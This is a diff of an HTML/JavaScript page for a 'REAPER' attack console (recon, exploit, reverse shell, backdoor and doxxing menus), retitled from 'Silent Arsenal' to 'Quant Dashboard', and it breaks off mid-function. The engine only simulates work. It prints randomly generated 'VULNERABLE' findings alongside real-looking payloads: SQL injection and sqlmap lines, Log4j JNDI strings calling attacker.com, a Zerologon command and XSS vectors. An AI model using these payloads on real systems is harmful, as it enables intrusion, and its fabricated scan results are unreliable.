@@ -3,278 +3,361 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>REAPER – Silent Arsenal</title>
+    <title>REAPER – Quant Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #0a0a0f;
-            color: #00e5ff;
-            font-family: 'Courier New', monospace;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background: #06080a;
+            color: #c8d6e5;
+            font-family: 'Inter', sans-serif;
             padding: 16px;
+            min-height: 100vh;
         }
-        .container {
-            width: 100%;
-            max-width: 1200px;
-            background: #111118;
-            border: 1px solid #00e5ff30;
-            border-radius: 16px;
-            padding: 28px;
-            box-shadow: 0 0 60px #00e5ff10;
+        .dashboard {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 240px 1fr;
+            gap: 20px;
+            min-height: 90vh;
         }
-        .header {
+        /* Sidebar */
+        .sidebar {
+            background: #0d1117;
+            border: 1px solid #1e2a3a;
+            border-radius: 12px;
+            padding: 24px 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+        .sidebar .logo {
+            font-size: 20px;
+            font-weight: 700;
+            color: #00e5ff;
+            letter-spacing: 1px;
+        }
+        .sidebar .logo span { color: #ff1744; }
+        .sidebar .menu {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .sidebar .menu a {
+            padding: 10px 14px;
+            border-radius: 8px;
+            color: #8b9bb5;
+            font-size: 13px;
+            font-weight: 500;
+            transition: 0.2s;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .sidebar .menu a:hover { background: #1a2634; color: #fff; }
+        .sidebar .menu a.active { background: #00e5ff10; color: #00e5ff; border-left: 3px solid #00e5ff; }
+        .sidebar .menu a i { width: 20px; text-align: center; }
+        .sidebar .stats-mini {
+            background: #0d1117;
+            border: 1px solid #1e2a3a;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: auto;
+        }
+        .sidebar .stats-mini .label { font-size: 11px; color: #5a6a7a; text-transform: uppercase; letter-spacing: 1px; }
+        .sidebar .stats-mini .value { font-size: 18px; font-weight: 600; color: #00e5ff; margin-top: 4px; }
+
+        /* Main */
+        .main {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        /* Top Bar */
+        .topbar {
+            background: #0d1117;
+            border: 1px solid #1e2a3a;
+            border-radius: 12px;
+            padding: 16px 24px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
             flex-wrap: wrap;
             gap: 12px;
         }
-        .header h1 { font-size: 26px; letter-spacing: 3px; font-weight: 700; }
-        .header h1 span { color: #ff1744; }
-        .status-badge {
+        .topbar .title h2 { font-size: 18px; font-weight: 600; color: #fff; }
+        .topbar .title p { font-size: 13px; color: #5a6a7a; }
+        .topbar .status {
             display: flex;
             align-items: center;
-            gap: 8px;
-            font-size: 13px;
-            color: #888;
+            gap: 12px;
         }
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            background: #00e5ff;
+        .topbar .status .dot {
+            width: 8px;
+            height: 8px;
             border-radius: 50%;
-            animation: pulse 1.5s infinite;
+            background: #4caf50;
             display: inline-block;
         }
+        .topbar .status .dot.executing { background: #ff9800; animation: pulse 0.8s infinite; }
+        .topbar .status .dot.error { background: #ff1744; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
-        .input-grid {
-            display: grid;
-            grid-template-columns: 1fr 1.5fr auto auto;
-            gap: 10px;
-            margin-bottom: 14px;
+        .topbar .status span { font-size: 13px; color: #8b9bb5; }
+
+        /* Input Panel */
+        .input-panel {
+            background: #0d1117;
+            border: 1px solid #1e2a3a;
+            border-radius: 12px;
+            padding: 16px 20px;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            align-items: center;
         }
-        @media (max-width: 820px) { .input-grid { grid-template-columns: 1fr 1fr; } }
-        @media (max-width: 520px) { .input-grid { grid-template-columns: 1fr; } }
-        .input-grid input, .input-grid select {
-            padding: 12px 16px;
-            background: #0a0a0f;
-            border: 1px solid #1e1e2a;
+        .input-panel input {
+            flex: 1;
+            min-width: 180px;
+            padding: 10px 16px;
+            background: #06080a;
+            border: 1px solid #1e2a3a;
             border-radius: 8px;
-            color: #e0e0e0;
-            font-family: inherit;
-            font-size: 14px;
-            transition: 0.2s;
+            color: #c8d6e5;
+            font-family: 'Inter', sans-serif;
+            font-size: 13px;
         }
-        .input-grid input:focus, .input-grid select:focus {
-            outline: none;
-            border-color: #00e5ff;
-            box-shadow: 0 0 20px #00e5ff10;
-        }
-        .input-grid button {
-            padding: 12px 24px;
+        .input-panel input:focus { outline: none; border-color: #00e5ff; }
+        .input-panel select {
+            padding: 10px 16px;
+            background: #06080a;
+            border: 1px solid #1e2a3a;
             border-radius: 8px;
-            font-family: inherit;
-            font-size: 14px;
-            font-weight: bold;
+            color: #c8d6e5;
+            font-family: 'Inter', sans-serif;
+            font-size: 13px;
+            min-width: 140px;
+        }
+        .input-panel select:focus { outline: none; border-color: #00e5ff; }
+        .input-panel button {
+            padding: 10px 24px;
+            border-radius: 8px;
+            border: none;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            font-size: 13px;
             cursor: pointer;
-            transition: 0.25s;
+            transition: 0.2s;
             display: flex;
             align-items: center;
             gap: 8px;
-            justify-content: center;
-            border: none;
         }
-        .btn-execute {
-            background: #00e5ff20;
-            border: 1px solid #00e5ff;
-            color: #00e5ff;
-        }
-        .btn-execute:hover:not(:disabled) {
-            background: #00e5ff40;
-            box-shadow: 0 0 30px #00e5ff20;
-            transform: scale(1.02);
-        }
-        .btn-stop {
-            background: #ff174420;
-            border: 1px solid #ff1744;
-            color: #ff1744;
-        }
-        .btn-stop:hover:not(:disabled) { background: #ff174440; box-shadow: 0 0 30px #ff174420; }
+        .btn-execute { background: #00e5ff20; border: 1px solid #00e5ff; color: #00e5ff; }
+        .btn-execute:hover:not(:disabled) { background: #00e5ff40; }
+        .btn-execute:disabled { opacity: 0.3; cursor: not-allowed; }
+        .btn-stop { background: #ff174420; border: 1px solid #ff1744; color: #ff1744; }
+        .btn-stop:hover:not(:disabled) { background: #ff174440; }
         .btn-stop:disabled { opacity: 0.3; cursor: not-allowed; }
-        .btn-execute:disabled { opacity: 0.4; cursor: not-allowed; }
-        .quick-cmds {
+
+        /* Quick Targets */
+        .quick-targets {
             display: flex;
-            gap: 8px;
+            gap: 6px;
             flex-wrap: wrap;
-            margin-bottom: 14px;
         }
-        .quick-cmds button {
-            background: #1a1a28;
-            border: 1px solid #1e1e2a;
+        .quick-targets button {
+            background: #0d1117;
+            border: 1px solid #1e2a3a;
             border-radius: 6px;
-            padding: 4px 14px;
-            color: #888;
-            font-size: 12px;
+            padding: 4px 12px;
+            color: #5a6a7a;
+            font-size: 11px;
+            font-family: 'Inter', sans-serif;
             cursor: pointer;
-            font-family: inherit;
             transition: 0.2s;
         }
-        .quick-cmds button:hover { border-color: #00e5ff40; color: #00e5ff; }
-        .output {
-            background: #0a0a0f;
-            border: 1px solid #1e1e2a;
-            border-radius: 8px;
+        .quick-targets button:hover { border-color: #00e5ff40; color: #00e5ff; }
+
+        /* Terminal */
+        .terminal {
+            background: #0d1117;
+            border: 1px solid #1e2a3a;
+            border-radius: 12px;
             padding: 16px;
-            min-height: 420px;
-            max-height: 560px;
+            min-height: 380px;
+            max-height: 520px;
             overflow-y: auto;
+            font-family: 'Courier New', monospace;
             font-size: 13px;
             line-height: 1.7;
+            color: #c8d6e5;
             white-space: pre-wrap;
             word-break: break-all;
-            color: #c0c0c0;
-            font-family: 'Courier New', monospace;
-            margin-top: 4px;
         }
-        .output .prompt { color: #00e5ff; }
-        .output .success { color: #4caf50; }
-        .output .error { color: #ff1744; }
-        .output .info { color: #ff9800; }
-        .output .highlight { color: #00e5ff; font-weight: bold; }
-        .output .warn { color: #ffeb3b; }
-        .output::-webkit-scrollbar { width: 5px; }
-        .output::-webkit-scrollbar-track { background: #0a0a0f; }
-        .output::-webkit-scrollbar-thumb { background: #00e5ff40; border-radius: 4px; }
+        .terminal .prompt { color: #00e5ff; }
+        .terminal .success { color: #4caf50; }
+        .terminal .error { color: #ff1744; }
+        .terminal .info { color: #ff9800; }
+        .terminal .highlight { color: #00e5ff; font-weight: bold; }
+        .terminal::-webkit-scrollbar { width: 5px; }
+        .terminal::-webkit-scrollbar-track { background: #06080a; }
+        .terminal::-webkit-scrollbar-thumb { background: #1e2a3a; border-radius: 4px; }
+
+        /* Footer */
         .footer {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 14px;
             font-size: 12px;
-            color: #444;
+            color: #5a6a7a;
             flex-wrap: wrap;
             gap: 8px;
         }
-        .footer .modules span { color: #666; margin: 0 4px; }
-        .footer .modules .active { color: #00e5ff; }
-        .footer-actions { display: flex; gap: 12px; align-items: center; }
+        .footer-actions { display: flex; gap: 12px; }
         .footer-actions button {
             background: transparent;
             border: none;
-            color: #666;
+            color: #5a6a7a;
             cursor: pointer;
-            font-size: 13px;
-            font-family: inherit;
+            font-size: 12px;
+            font-family: 'Inter', sans-serif;
             transition: 0.2s;
             display: flex;
             align-items: center;
             gap: 4px;
         }
         .footer-actions button:hover { color: #00e5ff; }
+
+        /* History */
         .history-panel {
-            background: #0a0a0f;
-            border: 1px solid #1e1e2a;
+            background: #0d1117;
+            border: 1px solid #1e2a3a;
             border-radius: 8px;
             padding: 12px 16px;
-            margin-top: 12px;
-            max-height: 120px;
+            max-height: 100px;
             overflow-y: auto;
             font-size: 12px;
-            color: #888;
             display: none;
         }
         .history-panel.visible { display: block; }
         .history-panel .entry {
-            padding: 4px 0;
-            border-bottom: 1px solid #14141e;
             display: flex;
-            gap: 12px;
-            justify-content: space-between;
+            gap: 16px;
+            padding: 4px 0;
+            border-bottom: 1px solid #1a2634;
+            font-size: 12px;
         }
         .history-panel .entry .h-target { color: #00e5ff; }
         .history-panel .entry .h-payload { color: #ff9800; }
         .history-panel .entry .h-outcome { color: #4caf50; }
         .history-panel .entry .h-outcome.fail { color: #ff1744; }
-        .history-panel .entry .h-outcome.stopped { color: #ffeb3b; }
-        .history-panel .entry .h-time { color: #444; font-size: 11px; }
+        .history-panel .entry .h-time { color: #5a6a7a; margin-left: auto; }
+
+        /* Progress */
         .progress-bar {
-            width: 100%;
-            height: 3px;
-            background: #1a1a28;
-            border-radius: 4px;
-            margin-top: 8px;
+            height: 2px;
+            background: #1a2634;
+            border-radius: 2px;
             overflow: hidden;
+            margin-top: 4px;
             display: none;
         }
+        .progress-bar.active { display: block; }
         .progress-bar .fill {
             height: 100%;
             width: 0%;
             background: #00e5ff;
-            border-radius: 4px;
             transition: width 0.3s;
         }
-        .progress-bar.active { display: block; }
+
+        @media (max-width: 820px) {
+            .dashboard { grid-template-columns: 1fr; }
+            .sidebar { display: none; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <!-- HEADER -->
-        <div class="header">
-            <h1>🖤 REAPER <span>//</span> SILENT</h1>
-            <div class="status-badge">
-                <span class="status-dot"></span>
-                <span id="statusText">ONLINE</span>
+<div class="dashboard">
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
+        <div class="logo">REAPER <span>//</span> Q</div>
+        <div class="menu">
+            <a class="active"><i class="fas fa-terminal"></i> Console</a>
+            <a><i class="fas fa-chart-line"></i> Analytics</a>
+            <a><i class="fas fa-list"></i> Modules</a>
+            <a><i class="fas fa-history"></i> History</a>
+            <a><i class="fas fa-sliders-h"></i> Settings</a>
+        </div>
+        <div class="stats-mini">
+            <div class="label">Modules Loaded</div>
+            <div class="value">20</div>
+        </div>
+        <div class="stats-mini" style="margin-top:8px;">
+            <div class="label">Executions</div>
+            <div class="value" id="execCount">0</div>
+        </div>
+    </aside>
+
+    <!-- MAIN -->
+    <div class="main">
+        <!-- TOPBAR -->
+        <div class="topbar">
+            <div class="title">
+                <h2>Execution Console</h2>
+                <p id="statusText">Ready</p>
+            </div>
+            <div class="status">
+                <span class="dot" id="statusDot"></span>
+                <span id="statusLabel">Online</span>
+                <span style="color:#5a6a7a;margin-left:8px;" id="execStatus">IDLE</span>
             </div>
         </div>
 
-        <!-- INPUT GRID -->
-        <div class="input-grid">
+        <!-- INPUT -->
+        <div class="input-panel">
             <input type="text" id="targetInput" placeholder="target.com or 192.168.1.1" value="example.com" />
             <select id="payloadSelect">
-                <optgroup label="🛡️ Recon">
-                    <option value="dns">DNS Enumeration</option>
-                    <option value="subdomain">Subdomain Discovery</option>
-                    <option value="whois">WHOIS Lookup</option>
-                    <option value="portscan">Port Scanner</option>
+                <optgroup label="Recon">
+                    <option value="dns">DNS Enum</option>
+                    <option value="subdomain">Subdomain</option>
+                    <option value="whois">WHOIS</option>
+                    <option value="portscan">Port Scan</option>
                     <option value="cve">CVE Lookup</option>
                 </optgroup>
-                <optgroup label="⚔️ Exploit">
+                <optgroup label="Exploit">
                     <option value="sql">SQL Injection</option>
-                    <option value="rce">Remote Code Execution</option>
-                    <option value="exploit">Known Exploits</option>
-                    <option value="zero">Zero-Day Stager</option>
-                    <option value="xss">XSS Scanner</option>
-                    <option value="lfi">LFI / RFI</option>
-                    <option value="ssrf">SSRF Test</option>
+                    <option value="rce">RCE</option>
+                    <option value="exploit">Exploits</option>
+                    <option value="zero">Zero-Day</option>
+                    <option value="xss">XSS</option>
+                    <option value="lfi">LFI/RFI</option>
+                    <option value="ssrf">SSRF</option>
                 </optgroup>
-                <optgroup label="🕸️ Persistence">
+                <optgroup label="Persistence">
                     <option value="shell">Reverse Shell</option>
-                    <option value="webshell">Webshell Upload</option>
-                    <option value="backdoor">Backdoor Inject</option>
+                    <option value="webshell">Webshell</option>
+                    <option value="backdoor">Backdoor</option>
                 </optgroup>
-                <optgroup label="🔍 OSINT">
-                    <option value="dox">OSINT / Dox</option>
+                <optgroup label="OSINT">
+                    <option value="dox">Dox</option>
                     <option value="email">Email Harvest</option>
-                    <option value="social">Social Media Scrape</option>
+                    <option value="social">Social Scrape</option>
                 </optgroup>
-                <optgroup label="🛡️ Defense">
+                <optgroup label="Defense">
                     <option value="waf">WAF Fingerprint</option>
                     <option value="bypass">WAF Bypass</option>
-                    <option value="cdn">CDN Detection</option>
+                    <option value="cdn">CDN Detect</option>
                 </optgroup>
             </select>
             <button class="btn-execute" id="executeBtn"><i class="fas fa-skull"></i> EXECUTE</button>
             <button class="btn-stop" id="stopBtn" disabled><i class="fas fa-stop"></i> STOP</button>
         </div>
 
-        <!-- QUICK COMMANDS -->
-        <div class="quick-cmds">
+        <!-- QUICK TARGETS -->
+        <div class="quick-targets">
             <button data-target="example.com">example.com</button>
             <button data-target="192.168.1.1">192.168.1.1</button>
             <button data-target="scanme.nmap.org">scanme.nmap.org</button>
@@ -284,666 +367,583 @@
             <button id="historyToggle"><i class="fas fa-clock"></i> History</button>
         </div>
 
-        <!-- PROGRESS BAR -->
-        <div class="progress-bar" id="progressBar">
-            <div class="fill" id="progressFill"></div>
+        <!-- PROGRESS -->
+        <div class="progress-bar" id="progressBar"><div class="fill" id="progressFill"></div></div>
+
+        <!-- TERMINAL -->
+        <div class="terminal" id="terminal">
+            <div><span class="prompt">[🖤]</span> <span style="color:#5a6a7a;">Reaper quant console ready.</span></div>
+            <div><span class="prompt">[🖤]</span> <span style="color:#5a6a7a;">20 modules loaded.</span></div>
         </div>
 
-        <!-- OUTPUT PANE -->
-        <div class="output" id="outputPane">
-            <div><span class="prompt">[🖤]</span> <span style="color:#888;">Reaper silent. 20 modules loaded.</span></div>
-            <div><span class="prompt">[🖤]</span> <span style="color:#666;">Recon · Exploit · Persistence · OSINT · Defense</span></div>
-        </div>
-
-        <!-- HISTORY PANEL -->
+        <!-- HISTORY -->
         <div class="history-panel" id="historyPanel">
-            <div style="color:#666;font-size:11px;margin-bottom:6px;">EXECUTION HISTORY</div>
+            <div style="color:#5a6a7a;font-size:11px;margin-bottom:6px;">EXECUTION HISTORY</div>
             <div id="historyList"></div>
         </div>
 
         <!-- FOOTER -->
         <div class="footer">
-            <div class="modules">
-                <span class="active">●</span> 20 modules
-            </div>
+            <span>20 modules · <span id="execCountFooter">0</span> executions</span>
             <div class="footer-actions">
-                <span id="execStatus">IDLE</span>
                 <button id="exportBtn"><i class="fas fa-download"></i> Export</button>
             </div>
         </div>
     </div>
+</div>
 
-    <script>
-        // ─── DOM REFS ───
-        const targetInput = document.getElementById('targetInput');
-        const payloadSelect = document.getElementById('payloadSelect');
-        const executeBtn = document.getElementById('executeBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const outputPane = document.getElementById('outputPane');
-        const execStatus = document.getElementById('execStatus');
-        const statusText = document.getElementById('statusText');
-        const historyPanel = document.getElementById('historyPanel');
-        const historyList = document.getElementById('historyList');
-        const progressBar = document.getElementById('progressBar');
-        const progressFill = document.getElementById('progressFill');
+<script>
+    // ─── DOM ───
+    const targetInput = document.getElementById('targetInput');
+    const payloadSelect = document.getElementById('payloadSelect');
+    const executeBtn = document.getElementById('executeBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const terminal = document.getElementById('terminal');
+    const statusText = document.getElementById('statusText');
+    const statusLabel = document.getElementById('statusLabel');
+    const statusDot = document.getElementById('statusDot');
+    const execStatus = document.getElementById('execStatus');
+    const progressBar = document.getElementById('progressBar');
+    const progressFill = document.getElementById('progressFill');
+    const historyPanel = document.getElementById('historyPanel');
+    const historyList = document.getElementById('historyList');
+    const execCount = document.getElementById('execCount');
+    const execCountFooter = document.getElementById('execCountFooter');
 
-        let isExecuting = false;
-        let abortController = null;
-        let history = [];
-        let currentProgress = 0;
+    let isExecuting = false;
+    let abortController = null;
+    let history = [];
+    let execCounter = 0;
 
-        // ─── HELPERS ───
-        function appendOutput(text, type = '') {
-            const line = document.createElement('div');
-            const prefix = type === 'success' ? '✓' : type === 'error' ? '✗' : type === 'info' ? '!' : type === 'warn' ? '⚠' :
-                '>';
-            const colorClass = type === 'success' ? 'success' : type === 'error' ? 'error' : type === 'info' ? 'info' :
-                type === 'warn' ? 'warn' : '';
-            line.innerHTML = `<span class="${colorClass}">[${prefix}]</span> ${text}`;
-            outputPane.appendChild(line);
-            outputPane.scrollTop = outputPane.scrollHeight;
+    // ─── HELPERS ───
+    function appendOutput(text, type = '') {
+        const line = document.createElement('div');
+        const prefix = type === 'success' ? '✓' : type === 'error' ? '✗' : type === 'info' ? '!' : type === 'warn' ? '⚠' : '>';
+        const colorClass = type === 'success' ? 'success' : type === 'error' ? 'error' : type === 'info' ? 'info' : type === 'warn' ? 'warn' : '';
+        line.innerHTML = `<span class="${colorClass}">[${prefix}]</span> ${text}`;
+        terminal.appendChild(line);
+        terminal.scrollTop = terminal.scrollHeight;
+    }
+
+    function clearTerminal() {
+        terminal.innerHTML = '';
+        appendOutput('Terminal cleared.', 'info');
+    }
+
+    function setStatus(text, idle = true, dotClass = '') {
+        statusText.textContent = text;
+        statusLabel.textContent = idle ? 'Online' : 'Executing';
+        statusDot.className = 'dot' + (dotClass ? ' ' + dotClass : '');
+        execStatus.textContent = idle ? 'IDLE' : 'EXECUTING';
+        executeBtn.disabled = !idle;
+        stopBtn.disabled = idle;
+        isExecuting = !idle;
+        if (idle) {
+            progressBar.classList.remove('active');
+            progressFill.style.width = '0%';
+        } else {
+            progressBar.classList.add('active');
         }
+    }
 
-        function clearOutput() {
-            outputPane.innerHTML = '';
-            appendOutput('Output cleared.', 'info');
-        }
+    function updateProgress(value) {
+        progressFill.style.width = Math.min(value, 100) + '%';
+    }
 
-        function setStatus(text, isIdle = true) {
-            execStatus.textContent = text;
-            statusText.textContent = isIdle ? 'ONLINE' : 'EXECUTING...';
-            executeBtn.disabled = !isIdle;
-            stopBtn.disabled = isIdle;
-            isExecuting = !isIdle;
-            if (isIdle) {
-                progressBar.classList.remove('active');
-                progressFill.style.width = '0%';
-                currentProgress = 0;
-            } else {
-                progressBar.classList.add('active');
-            }
-        }
-
-        function updateProgress(value) {
-            currentProgress = Math.min(value, 100);
-            progressFill.style.width = currentProgress + '%';
-        }
-
-        function addHistory(target, payload, outcome) {
-            const entry = {
-                id: Date.now(),
-                target,
-                payload,
-                outcome,
-                timestamp: new Date().toLocaleTimeString()
-            };
-            history.unshift(entry);
-            if (history.length > 30) history.pop();
-            renderHistory();
-        }
-
-        function renderHistory() {
-            if (history.length === 0) {
-                historyList.innerHTML = '<div style="color:#444;padding:8px 0;">No executions yet.</div>';
-                return;
-            }
-            historyList.innerHTML = history.map(h => `
-                <div class="entry">
-                    <span class="h-target">${h.target}</span>
-                    <span class="h-payload">${h.payload.toUpperCase()}</span>
-                    <span class="h-outcome ${h.outcome === 'FAIL' ? 'fail' : h.outcome === 'STOPPED' ? 'stopped' : ''}">${h.outcome}</span>
-                    <span class="h-time">${h.timestamp}</span>
-                </div>
-            `).join('');
-        }
-
-        function toggleHistory() { historyPanel.classList.toggle('visible'); }
-
-        function exportLogs() {
-            const logs = outputPane.innerText;
-            const blob = new Blob([logs], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `reaper-log-${Date.now()}.txt`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-        }
-
-        // ─── EXECUTION ENGINE ───
-        function executePayload(target, payload) {
-            return new Promise((resolve, reject) => {
-                const results = [];
-                let stepCount = 0;
-                const totalSteps = 12 + Math.floor(Math.random() * 8);
-
-                const add = (line, type = '') => {
-                    results.push({ line, type });
-                    appendOutput(line, type);
-                    stepCount++;
-                    updateProgress((stepCount / totalSteps) * 100);
-                };
-
-                add(`─────────────────────────────`, 'info');
-                add(`TARGET: ${target}`, 'info');
-                add(`PAYLOAD: ${payload.toUpperCase()}`, 'info');
-                add(`─────────────────────────────`, 'info');
-
-                // ── RECON ──
-                if (payload === 'dns') {
-                    add(`[→] DNS enumeration...`);
-                    setTimeout(() => add(`[→] A: 93.184.216.34`, 'success'), 200);
-                    setTimeout(() => add(`[→] MX: mail.${target}`, 'success'), 400);
-                    setTimeout(() => add(`[→] TXT: v=spf1 include:_spf.${target}`, 'success'), 600);
-                    setTimeout(() => add(`[→] NS: ns1.${target}, ns2.${target}`, 'success'), 800);
-                    setTimeout(() => {
-                        add(`[✓] DNS complete.`, 'success');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1200);
-                    return;
-                }
-
-                if (payload === 'subdomain') {
-                    add(`[→] Subdomain enumeration...`);
-                    const subs = ['mail', 'dev', 'api', 'admin', 'ftp', 'blog', 'shop', 'vpn', 'test', 'stage'];
-                    subs.forEach((s, i) => {
-                        setTimeout(() => {
-                            const found = Math.random() > 0.4;
-                            add(`[→] ${s}.${target} ${found ? '✓' : '✗'}`, found ? 'success' : '');
-                            updateProgress(((i + 1) / subs.length) * 80 + 10);
-                        }, (i + 1) * 120);
-                    });
-                    setTimeout(() => {
-                        add(`[✓] 4 live subdomains found.`, 'success');
-                        add(`[!] mail.${target}, dev.${target}, api.${target}, admin.${target}`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1800);
-                    return;
-                }
-
-                if (payload === 'whois') {
-                    add(`[→] WHOIS lookup...`);
-                    setTimeout(() => add(`[→] Registrar: GoDaddy LLC`, 'success'), 200);
-                    setTimeout(() => add(`[→] Created: 2010-03-15`, 'success'), 400);
-                    setTimeout(() => add(`[→] Expires: 2027-03-15`, 'success'), 600);
-                    setTimeout(() => add(`[→] NS: ns1.${target}, ns2.${target}`, 'success'), 800);
-                    setTimeout(() => {
-                        add(`[✓] WHOIS complete.`, 'success');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1200);
-                    return;
-                }
-
-                if (payload === 'portscan') {
-                    add(`[→] Port scanning...`);
-                    const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900,
-                        8080, 8443
-                    ];
-                    const openPorts = [];
-                    ports.forEach((p, i) => {
-                        setTimeout(() => {
-                            const status = Math.random() > 0.65;
-                            if (status) openPorts.push(p);
-                            add(`[→] Port ${p}: ${status ? 'OPEN' : 'closed'}`, status ? 'success' : '');
-                            updateProgress(((i + 1) / ports.length) * 80 + 10);
-                        }, (i + 1) * 50);
-                    });
-                    setTimeout(() => {
-                        add(`[✓] ${openPorts.length} open ports.`, 'success');
-                        add(`[!] ${openPorts.join(', ')}`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 2500);
-                    return;
-                }
-
-                if (payload === 'cve') {
-                    add(`[→] CVE lookup...`);
-                    const cves = [
-                        'CVE-2021-44228 (Log4j) - Critical',
-                        'CVE-2017-5638 (Struts2) - Critical',
-                        'CVE-2020-1472 (Zero-Logon) - Critical',
-                        'CVE-2019-0708 (BlueKeep) - Critical',
-                        'CVE-2021-26855 (ProxyLogon) - High'
-                    ];
-                    cves.forEach((c, i) => {
-                        setTimeout(() => {
-                            add(`[→] ${c}`, Math.random() > 0.4 ? 'success' : '');
-                            updateProgress(((i + 1) / cves.length) * 80 + 10);
-                        }, (i + 1) * 300);
-                    });
-                    setTimeout(() => {
-                        add(`[✓] 3 high-impact CVEs.`, 'success');
-                        add(`[!] Prioritize: CVE-2021-44228, CVE-2020-1472`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 2000);
-                    return;
-                }
-
-                // ── EXPLOIT ──
-                if (payload === 'sql') {
-                    add(`[→] SQLi scan...`);
-                    const paths = ['/index.php?id=1', '/product.php?id=1', '/page.php?id=1', '/article.php?id=1',
-                        '/user.php?id=1'
-                    ];
-                    paths.forEach((p, i) => {
-                        setTimeout(() => {
-                            const vulnerable = Math.random() > 0.6;
-                            add(`[→] ${p} ${vulnerable ? 'VULNERABLE' : 'safe'}`, vulnerable ?
-                                'success' : '');
-                            updateProgress(((i + 1) / paths.length) * 80 + 10);
-                        }, (i + 1) * 150);
-                    });
-                    setTimeout(() => {
-                        add(`[✓] SQLi on /product.php?id=1`, 'success');
-                        add(`[!] ' OR '1'='1' -- `, 'info');
-                        add(`[!] sqlmap -u http://${target}/product.php?id=1 --batch`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1400);
-                    return;
-                }
-
-                if (payload === 'rce') {
-                    add(`[→] RCE scan...`);
-                    const vulns = ['Log4j', 'Struts2', 'Spring4Shell', 'PHP-CGI', 'Drupalgeddon'];
-                    vulns.forEach((v, i) => {
-                        setTimeout(() => {
-                            const found = Math.random() > 0.5;
-                            add(`[→] ${v} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
-                            updateProgress(((i + 1) / vulns.length) * 80 + 10);
-                        }, (i + 1) * 250);
-                    });
-                    setTimeout(() => {
-                        add(`[✓] Log4j identified.`, 'success');
-                        add(`[!] \${jndi:ldap://attacker.com/exploit}`, 'info');
-                        add(`[!] curl -H "X-Api-Version: \${jndi:ldap://attacker.com/}" http://${target}`,
-                            'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 2000);
-                    return;
-                }
-
-                if (payload === 'exploit') {
-                    add(`[→] Exploit scan...`);
-                    const exploits = ['Zero-Logon', 'EternalBlue', 'BlueKeep', 'SMBGhost', 'ProxyShell'];
-                    exploits.forEach((e, i) => {
-                        setTimeout(() => {
-                            const found = Math.random() > 0.5;
-                            add(`[→] ${e} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
-                            updateProgress(((i + 1) / exploits.length) * 80 + 10);
-                        }, (i + 1) * 200);
-                    });
-                    setTimeout(() => {
-                        add(`[✓] Zero-Logon detected on port 445.`, 'success');
-                        add(`[!] python3 zerologon.py <dc-name> ${target}`, 'info');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1600);
-                    return;
-                }
-
-                if (payload === 'zero') {
-                    add(`[→] Zero-day stager...`);
-                    add(`[→] Generating polymorphic payload...`);
-                    setTimeout(() => add(`[→] Base64 + XOR encoding...`), 300);
-                    setTimeout(() => add(`[→] JS + HTML5 delivery...`), 600);
-                    setTimeout(() => add(`[→] Obfuscating...`), 900);
-                    setTimeout(() => {
-                        add(`[✓] Payload ready.`, 'success');
-                        add(`[!] <script src="https://${target}/cdn/payload.js"></script>`, 'info');
-                        add(`[!] Requires private zero-day repo.`, 'warn');
-                        add(`─────────────────────────────`, 'info');
-                        add(`[✓] Done.`, 'success');
-                        resolve(results);
-                    }, 1400);
-                    return;
-                }
-
-                if (payload === 'xss') {
-                    add(`[→] XSS scan...`);
-                    const xssVectors = ['/search?q=<script>alert(1)</script>',
-                        '/comment?text=<img src=x onerror=alert(1)>',
-                        '/profile?name=<svg/onload=alert(1)>'
-                    ];
-                    xssVectors.forEach((v, i) => {
-                        setTimeout(() => {
-                            const found = Math.random() > 0.5;
-                            add(`[→] ${v} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
-                            updateProgress(((i + 1) / xssVectors.length) * 80 + 10);
-                        }, (i + 1) * 180);
-                    });
-                    setTimeout(() => {
